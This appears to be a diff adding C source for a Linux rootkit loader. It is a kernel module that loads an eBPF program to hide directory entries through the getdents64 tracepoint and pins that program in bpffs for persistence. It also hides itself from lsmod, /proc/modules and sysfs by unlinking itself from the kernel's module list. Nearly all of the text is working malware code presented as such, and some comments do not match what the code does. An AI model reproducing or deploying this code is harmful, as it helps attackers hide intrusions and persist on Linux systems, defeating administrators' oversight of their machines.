@@ -1,0 +1,35 @@
+// This LKM loads and manages the eBPF program
+static int load_ebpf_rootkit(void) {
+    struct bpf_object *obj;
+    struct bpf_program *prog;
+    
+    // Load the compiled eBPF bytecode
+    obj = bpf_object__open_file("rootkit.bpf.o", NULL);
+    bpf_object__load(obj);
+    
+    // Get our hiding program
+    prog = bpf_object__find_program_by_name(obj, "hide_getdents");
+    
+    // Attach to the getdents64 tracepoint
+    struct bpf_link *link = bpf_program__attach_tracepoint(prog, 
+        "syscalls", "sys_exit_getdents64");
+    
+    // Pin the program to bpffs for persistence
+    bpf_program__pin(prog, "/sys/fs/bpf/rootkit_hide");
+    
+    // LKM can also hide eBPF pins from bpftool by 
+    // filtering /sys/fs/bpf entries using the same technique
+    return 0;
+}
+
+// Classic technique: remove module from lsmod and /proc/modules
+static void hide_module(void) {
+    struct list_head *prev_module;
+    
+    // Find our module in the kernel's module list
+    list_del(&THIS_MODULE->list);  // Remove from linked list
+    kobject_del(&THIS_MODULE->mkobj.kobj);  // Hide from sysfs
+    
+    // Override module's show function to always return empty
+    THIS_MODULE->state = MODULE_STATE_UNFORMED;
+}
